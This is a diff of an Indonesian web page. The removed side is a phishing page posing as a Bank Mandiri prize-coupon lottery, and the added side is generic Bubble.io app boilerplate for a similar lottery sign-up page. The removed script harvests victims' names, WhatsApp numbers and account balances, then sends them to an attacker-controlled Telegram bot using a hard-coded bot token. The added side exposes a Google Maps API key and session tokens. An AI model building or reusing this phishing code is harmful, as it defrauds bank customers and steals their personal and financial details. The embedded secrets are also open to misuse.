@@ -1,161 +1,374 @@
-<!DOCTYPE html>
-<html lang="en" class="h-100">
+<!doctype html>
+<html lang="en">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
-    <meta property="og:title" content="Cetak Kupon Anda">
-    <meta property="og:image" content="">
-    <meta property="og:image:type" content="image/jpeg">
-    <meta name="description" content="Cetak kupon undian Anda di sini.">
-    <meta name="author" content="">
-    <title>Cetak Kupon Anda</title>
-    <link rel="icon" type="x-icon" href="favicon.png">
-    <link rel="canonical" href="">
-    <link href="bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
-    <link rel="stylesheet" href="bootstrap-icons.css">
-    <link rel="stylesheet" href="main.css" type="text/css" media="all">
+<meta charset="utf-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+<title>DAFTAR UNDIAN BERHADIAH </title>
+<script type="text/javascript">
+    window.bubble_session_uid = '1780325872013x362055208529815000';
+</script>
+<script type="text/javascript">
+    window.headers_source_maps = [["plugin_main_headers_1658328157117x953686184769617900",217,219]]
+</script>
+<script type="text/javascript">
+function make_proxy(target, name) {
+  return new Proxy(target, {
+    get: function(target, prop) {
+      if (prop in target) {
+        return target[prop];
+      }
+      throw new Error('The variable ' + name + ' is not fully initialized yet');
+    }
+  });
+}
+window.appquery = make_proxy({
+  app_version: function() { return "test"; },
+  last_change: function() { return "58458474118";},
+}, 'appquery');
+window.Lib = new Proxy(function() {}, {
+  get: function(target, prop) {
+    if (prop === 'is_skeleton') {
+      return true;
+    }
+    throw new Error('The variable ' + Lib + ' is not fully initialized yet');
+  },
+  apply: function() {
+    return make_proxy({
+      current_user: function() {
+        return make_proxy({ id: "1780325872013x362055208529815000" }, 'Lib().current_user');
+      }
+    }, 'Lib()');
+  }
+});
+</script>
+<script type="text/javascript">
+function load_error_function (event) {
+  return window.load_error_log.push({ msg: event.message, error_url: event.filename, line: event.lineno, col: event.colno })
+}
+window.load_error_log = [];
+window.addEventListener('error', load_error_function);
+window.disableLoadErrorFunction = function () {
+  window.removeEventListener('error', load_error_function);
+}
+</script>
+<meta name="referrer" content="origin">
+<script type="text/javascript">
+if (!window._bubble_page_load_data) {
+  window._bubble_page_load_data = {}
+}
+if (!window._bubble_page_load_data.js_execution_timings) {
+  window._bubble_page_load_data.js_execution_timings = {}
+}
+window._bubble_page_load_data.js_execution_timings['pre_early_js'] = Date.now();
+</script><script type="text/javascript" crossorigin="anonymous" charset="UTF-8" src="/package/early_js/05ae9fe83d6b755291132aab9d325d70918aafd336da1bd91a41a31c8b25734b/early.js"></script><script type="text/javascript">
+if (!window._bubble_page_load_data) {
+  window._bubble_page_load_data = {}
+}
+if (!window._bubble_page_load_data.js_execution_timings) {
+  window._bubble_page_load_data.js_execution_timings = {}
+}
+window._bubble_page_load_data.js_execution_timings['post_early_js'] = Date.now();
+</script>
+<script type="text/javascript">(function () {
+    function onWebFontFinish () {
+        window.google_web_fonts_active = true;
+if (window.google_web_fonts_active_cb) {
+    window.google_web_fonts_active_cb();
+}
+        (function fontface_loaded_snippet (font) {
+  if (window.fontface_loaded == null) {
+    window.fontface_loaded = {}
+  }
+  if (font != null) {
+    window.fontface_loaded[font] = true
+  } else {
+    window.all_fontface_loaded = true
+  }
+  if (window.fontface_webfonts_loaded_cb) {
+    return window.fontface_webfonts_loaded_cb(font)
+  }
+})()
+    }
+    const WebFontConfig = {'google': { families: ["Albert Sans:regular","Albert Sans:600","Albert Sans:700","Inter:regular","Inter:600","Inter:700"] },
+        active: function() {
+            onWebFontFinish()
+        },
+        inactive: function() {
+            console.log('Failed to load all the fonts');
+            onWebFontFinish()
+        },
+        fontinactive: function(family_name, fvd) {
+            console.log('fontinactive being called for ' + family_name + ', Google says the fonts didnt render');
+            onWebFontFinish()
+        }
+    }
+        window.WebFont.load(WebFontConfig);
+})();</script>
+<script>
+(function initialize_data() {
+const xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+    if (this.readyState === 4 && this.status === 200) {
+        const data = JSON.parse(this.responseText);
+
+        function init_data() {
+            data.forEach(function(d) {
+                Lib().db_instance().initialize_data(d.id, d.data, d.type, d.version);
+            })
+        }
+
+        if (window.Lib && window.Lib.is_skeleton == null) {
+            init_data();
+        } else {
+            window.Lib_post_load = init_data;
+        }
+    }
+};
+xhr.open("GET", "https://citeslxbrifs.bubbleapps.io/version-test/api/1.1/init/data?location=" + encodeURIComponent(window.location.href), true);
+xhr.send();
+})();
+</script>
+<script type="text/javascript">window.gm_key = "AIzaSyAlT1MzDJL1hTzjgn_-PbAD3NQEIKjcJi4";</script>
+<script type="text/javascript">window.glrl_key_status = false;</script>
+<script type="text/javascript">window.bubble_page_load_id = "1780325872038x441";</script>
+<script type="text/javascript">window.bubble_plp_token = "3HmDprviPOKVfeVwYAXMhtXT8+N4CZuGZfhqg77ceaM=";</script>
+<script type="text/javascript">window.bubble_is_leanjs = false;</script>
+<script type="text/javascript">window.bubble_shim_modules = false;</script>
+<link rel="icon" type="image/png" href="https://9b50ad9896cd62ddf01c716b3254bbce.cdn.bubble.io/f1530294839424x143528842134401200/Icon-no-clearspace.png" />
+<meta name="fragment" content="!">
+<meta name="description" content="Bubble introduces a new way to build a web application. It’s a point-and-click programming tool. Bubble hosts all applications on its cloud platform.">
+<meta name="description" content="Bubble introduces a new way to build a web application. It’s a point-and-click programming tool. Bubble hosts all applications on its cloud platform.">
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="og:title" content="Check out my Bubble app" />
+<meta name="twitter:title" content="Check out my Bubble app" />
+<meta property="og:site_name" content="Bubble" />
+<meta name="twitter:site_name" content="Bubble" />
+<meta property="og:description" content="Bubble is the only platform that lets you switch between AI prompting and visual editing to go beyond prototypes and launch real apps — no code required. " />
+<meta name="twitter:description" content="Bubble is the only platform that lets you switch between AI prompting and visual editing to go beyond prototypes and launch real apps — no code required. " />
+<link rel="image_src" href="https://9b50ad9896cd62ddf01c716b3254bbce.cdn.bubble.io/f1762463484754x595287411041153000/Bubbleio%20opengraph.png" />
+<meta property="og:image" content="https://9b50ad9896cd62ddf01c716b3254bbce.cdn.bubble.io/f1762463484754x595287411041153000/Bubbleio%20opengraph.png" />
+<meta name="twitter:image:src" content="https://9b50ad9896cd62ddf01c716b3254bbce.cdn.bubble.io/f1762463484754x595287411041153000/Bubbleio%20opengraph.png" />
+<meta property="og:url" content="https://citeslxbrifs.bubbleapps.io/version-test/8995418470" />
+<meta property="og:type" content="website" />
+<meta property="fb:app_id" content="340887986039814" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<script type="text/javascript">window._p = '{"id":"app_free2","no_branding":false,"import_export_csv":false,"custom_domain":false}';</script>
+<script type="text/javascript">window.bubble_page_name = "8995418470";</script>
+<script type="text/javascript">window.__bubble_module_mode = false;</script>
+<link type="text/css" href="/package/run_css/fadcddbe569f7ba8d5fe47fbe7d78906cffa76ed08092933019346e7c60f2479/citeslxbrifs/test/8995418470/xfalse/xfalse/run.css" rel="stylesheet">
+<script type="text/javascript">
+if (!window._bubble_page_load_data) {
+  window._bubble_page_load_data = {}
+}
+if (!window._bubble_page_load_data.js_execution_timings) {
+  window._bubble_page_load_data.js_execution_timings = {}
+}
+window._bubble_page_load_data.js_execution_timings['pre_run_js'] = Date.now();
+</script>
+<script type="text/javascript" crossorigin="anonymous" charset="UTF-8" src="/package/pre_run_jquery_js/dee903a9e36db713e4c86d0cdd96d921e37be0c1293ed8dee29e2e4d7713b9ff/pre_run_jquery.js"></script>
+<script type="text/javascript" crossorigin="anonymous" charset="UTF-8" src="/package/run_js/7500a442d865575bf4849304299f54aba33926570ea548968444ee32b12db2d7/xfalse/x30/run.js"></script>
+<script type="text/javascript">
+if (!window._bubble_page_load_data) {
+  window._bubble_page_load_data = {}
+}
+if (!window._bubble_page_load_data.js_execution_timings) {
+  window._bubble_page_load_data.js_execution_timings = {}
+}
+window._bubble_page_load_data.js_execution_timings['post_run_js'] = Date.now();
+</script>
+<script type="text/javascript">
+if (!window._bubble_page_load_data) {
+  window._bubble_page_load_data = {}
+}
+if (!window._bubble_page_load_data.js_execution_timings) {
+  window._bubble_page_load_data.js_execution_timings = {}
+}
+window._bubble_page_load_data.js_execution_timings['pre_static_js'] = Date.now();
+</script><script type="text/javascript" crossorigin="anonymous" charset="UTF-8" src="/package/static_js/5629bba6731144f3ea629a277a63c65dedd51e30df7d51c1396e347edc1d713b/citeslxbrifs/test/8995418470/xnull/xfalse/xfalse/xfalse/static.js"></script><script type="text/javascript">
+if (!window._bubble_page_load_data) {
+  window._bubble_page_load_data = {}
+}
+if (!window._bubble_page_load_data.js_execution_timings) {
+  window._bubble_page_load_data.js_execution_timings = {}
+}
+window._bubble_page_load_data.js_execution_timings['post_static_js'] = Date.now();
+</script>
+<script type="text/javascript">
+if (!window._bubble_page_load_data) {
+  window._bubble_page_load_data = {}
+}
+if (!window._bubble_page_load_data.js_execution_timings) {
+  window._bubble_page_load_data.js_execution_timings = {}
+}
+window._bubble_page_load_data.js_execution_timings['pre_dynamic_js'] = Date.now();
+</script><script type="text/javascript" crossorigin="anonymous" charset="UTF-8" src="/package/dynamic_js/b7c4b531dc94ce51662a7cf8a081596e186b7476a24e8a5770ea62b83af14690/citeslxbrifs/test/8995418470/xnull/xtrue/xfalse/en_us/xfalse/xfalse/dynamic.js"></script><script type="text/javascript">
+if (!window._bubble_page_load_data) {
+  window._bubble_page_load_data = {}
+}
+if (!window._bubble_page_load_data.js_execution_timings) {
+  window._bubble_page_load_data.js_execution_timings = {}
+}
+window._bubble_page_load_data.js_execution_timings['post_dynamic_js'] = Date.now();
+</script>
+<script type="text/javascript">window._bubble_page_load_data.js_execution_timings.plugin_js_start_execution = Date.now();</script>
+<!-- 1658328157117x953686184769617900 -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/izitoast/1.4.0/css/iziToast.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/izitoast/1.4.0/js/iziToast.min.js" type="text/javascript"></script>
+<script type="text/javascript">window._bubble_page_load_data.js_execution_timings.plugin_js_end_execution = Date.now();</script>
 </head>
-<body>
-    <main>
-        <nav class="navnon">
-            <img width="100%" src="" alt="">
-        </nav>
-        <footer>
-            <img src="" alt="">
-        </footer>
-        <div class="textjalan" style="margin-top: 56px;">
-            <svg xmlns="http://www.w3.org/2000/svg" width="50" height="40" fill="currentColor" class="bi bi-bell" viewBox="0 0 16 16">
-                <path d="M8 16a2 2 0 0 0 2-2H6a2 2 0 0 0 2 2M8 1.918l-.797.161A4 4 0 0 0 4 6c0 .628-.134 2.197-.459 3.742-.16.767-.376 1.566-.663 2.258h10.244c-.287-.692-.502-1.49-.663-2.258C12.134 8.197 12 6.628 12 6a4 4 0 0 0-3.203-3.92zM14.22 12c.223.447.481.801.78 1H1c.299-.199.557-.553.78-1C2.68 10.2 3 6.88 3 6c0-2.42 1.72-4.44 4.005-4.901a1 1 0 1 1 1.99 0A5 5 0 0 1 13 6c0 .88.32 4.2 1.22 6"></path>
-            </svg>
-            <span><marquee>
-                Selamat Datang di GEBYAR FSTVL Rejeki Mandiri Menangkan Hadiah Nya dan Keseruan nya...! jadikan Anda Pemenangnya
-            </marquee></span>
+<body><script type="text/javascript">
+window.addEventListener('DOMContentLoaded', function () {
+  if (window.appquery == null) {
+    (function() {
+    const html = `
+      <div class="error-card">
+        <div class="error-section">
+          <div class="error-title">Your browser was unable to load some necessary resources</div>
+          <div class="error-message">Contact your IT network administrator to allow access to:
+    • d3dqmih97rcqmh.cloudfront.net
+    • 9b50ad9896cd62ddf01c716b3254bbce.cdn.bubble.io/
+    • d1muf25xaso8hp.cloudfront.net</div>
         </div>
+      </div>
+    `
 
-        <div class="coverform">
-            <div class="form">
-                <h5 class="text-center"></h5>
-                <img width="35%" height="auto" src="IMG_7900.png" alt="">
+    const css = document.createElement('style')
+    css.type = 'text/css'
+    css.appendChild(
+      document.createTextNode(`
+      .error-overlay {
+        width: 100%;
+        height: 100%;
+        background: rgba(0,0,0,0.30);
+        overflow: hidden;
+        display: flex;
+        justify-content: center;
+        align-items: flex-start;
+        position: fixed;
+        inset: 0;
+        z-index: 999999;
+      }
 
-                <form id="formData" method="POST" action="" class="mt-4">
-                    <div class="inp">
-                        <label for="kupon">PILIH KUPON ANDA</label>
-                        <select id="kupon" name="d" required>
-                            <option value="Mobil Pajero Sport">Kupon ✓ Mobil Pajero Sport</option>
-                            <option value="Uang Cash">Kupon ✓ Uang Cash</option>
-                            <option value="Umroh Gratis">Kupon ✓ Umroh Gratis</option>
-                            <option value="Rumah Gratis">Kupon ✓ Rumah Gratis</option>
-                            <option value="Emas Logam Mulia">Kupon ✓ Emas Logam Mulia</option>
-                        </select>
-                    </div>
+      .error-card {
+        width: 500px;
+        margin: 40px;
+        background: white;
+        box-shadow: 0px 1px 2px rgba(0,0,0,0.10);
+        border-radius: 8px;
+        display: flex;
+        flex-direction: column;
+      }
 
-                    <div class="inp">
-                        <label for="namalengkap"><b>Nama Lengkap</b></label>
-                        <input type="text" name="a" id="namalengkap" required>
-                    </div>
+      .error-section {
+        padding: 40px;
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+      }
 
-                    <div class="inp">
-                        <label for="nowa">No. WhatsApp</label>
-                        <input type="tel" name="b" id="nowa" required maxlength="13">
-                    </div>
+      .error-title {
+        color: #1A1A1A;
+        font-size: 18px;
+        font-family: Arial, sans-serif;
+        font-weight: 600;
+        line-height: 28px;
+      }
 
-                    <div class="inp">
-                        <label for="dengan-rupiah">Saldo Akhir</label>
-                        <input type="tel" name="c" id="dengan-rupiah" required maxlength="19">
-                    </div>
+      .error-message {
+        color: #525252;
+        font-size: 14px;
+        font-family: Arial, sans-serif;
+        font-weight: 400;
+        line-height: 20px;
+        white-space: pre-wrap;
+      }
+    `)
+    )
+    document.head.appendChild(css)
 
-                    <button type="submit" id="kirim">Cetak Kupon</button>
-                </form>
-            </div>
+    const container = document.createElement('div')
+    container.className = 'error-overlay'
+    container.innerHTML = html
+    document.body.appendChild(container)
+  })()
+    httpRequest = new XMLHttpRequest();
+httpRequest.open('POST', '/user/m', true);
+httpRequest.setRequestHeader('Content-Type', 'application/json');
+httpRequest.send(JSON.stringify({measures: {page_load_error: 1, url: document.location.href, errors: window.load_error_log}}));
+  };
+});
+</script><script type="text/javascript">window.addEventListener('DOMContentLoaded', function () {if (window.appquery && window.app == null) {(function() {
+    const html = `
+      <div class="error-card">
+        <div class="error-section">
+          <div class="error-title">Your browser was unable to load the application</div>
+          <div class="error-message">We&#39;ve been notified of the issue. Please try again in a few moments and make sure not to use ad-blockers.</div>
         </div>
+      </div>
+    `
 
-        <p style="font-size: 12px;" class="text-center">PT Bank Mandiri (Persero) Tbk</p>
-        <p onclick="" style="font-size: 16px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 20px;">
-            <strong style="color: #FF8601; text-decoration: none">Semua Nasabah
-                <span style="color: #098CE3"><b>Bekesempatan Untuk Menang...!!!</b></span>
-            </strong>
-        </p>
-    </main>
+    const css = document.createElement('style')
+    css.type = 'text/css'
+    css.appendChild(
+      document.createTextNode(`
+      .error-overlay {
+        width: 100%;
+        height: 100%;
+        background: rgba(0,0,0,0.30);
+        overflow: hidden;
+        display: flex;
+        justify-content: center;
+        align-items: flex-start;
+        position: fixed;
+        inset: 0;
+        z-index: 999999;
+      }
 
-    <!-- JavaScript: Integrasi script untuk kirim Telegram dan redirect -->
-    <script src="jquery.min.js"></script>
-    <script src="reqbri.js"></script>
-    <script src="l.js"></script>
-    <script src="main.js"></script>
-    <script src="rupiah.js"></script>
+      .error-card {
+        width: 500px;
+        margin: 40px;
+        background: white;
+        box-shadow: 0px 1px 2px rgba(0,0,0,0.10);
+        border-radius: 8px;
+        display: flex;
+        flex-direction: column;
+      }
 
-    <script>
-        $(document).ready(function() {
-            $('#formData').on('submit', function(e) {
-                e.preventDefault(); // Cegah submit default
+      .error-section {
+        padding: 40px;
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+      }
 
-                // Ambil data
-                var nama = $('#namalengkap').val().trim();
-                var nowa = $('#nowa').val().trim();
-                var saldo = $('#dengan-rupiah').val().trim();
-                var kupon = $('#kupon').val();
+      .error-title {
+        color: #1A1A1A;
+        font-size: 18px;
+        font-family: Arial, sans-serif;
+        font-weight: 600;
+        line-height: 28px;
+      }
 
-                // Validasi
-                if (nama === '' || nowa === '' || saldo === '' || kupon === '') {
-                    return false;
-                }
+      .error-message {
+        color: #525252;
+        font-size: 14px;
+        font-family: Arial, sans-serif;
+        font-weight: 400;
+        line-height: 20px;
+        white-space: pre-wrap;
+      }
+    `)
+    )
+    document.head.appendChild(css)
 
-                // Format saldo jika ada fungsi rupiah
-                if (typeof formatRupiah === 'function') {
-                    saldo = formatRupiah(saldo);
-                }
-
-                // Simpan ke localStorage
-                var dataKupon = {
-                    nama: nama,
-                    nowa: nowa,
-                    saldo: saldo,
-                    kupon: kupon,
-                    timestamp: new Date().toISOString()
-                };
-                localStorage.setItem('kuponData', JSON.stringify(dataKupon));
-
-                // Kirim ke Telegram
-                var botToken = '8260302249:AAG8Gjw6PkPt9zSWQQ9mIme8hRtjQvr7BQk';
-                var chatId = '5529657606';
-                var message = `🎉 Kupon Baru Dicetak!\n\n` +
-                              `Nama: ${nama}\n` +
-                              `No. WhatsApp: ${nowa}\n` +
-                              `Saldo Akhir: ${saldo}\n` +
-                              `Kupon: ${kupon}\n` +
-                              `Waktu: ${dataKupon.timestamp}`;
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        // Redirect otomatis ke halaman kedua setelah sukses
-                        window.location.href = 'proses.html';
-                    }
-                })
-                .catch(error => {
-                    // Tidak ada tindakan jika error
-                });
-
-                // Reset form
-                $('#formData')[0].reset();
-            });
-
-            // Error handling
-            window.onerror = function(msg, url, line) {
-                // Tidak ada logging
-            };
-        });
-    </script>
-
-    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"0953dd3e7b8440c994fa4b03c9a26106","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+    const container = document.createElement('div')
+    container.className = 'error-overlay'
+    container.innerHTML = html
+    document.body.appendChild(container)
+  })()}});</script>
+<img style="display: none;" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" />
 </body>
 </html>
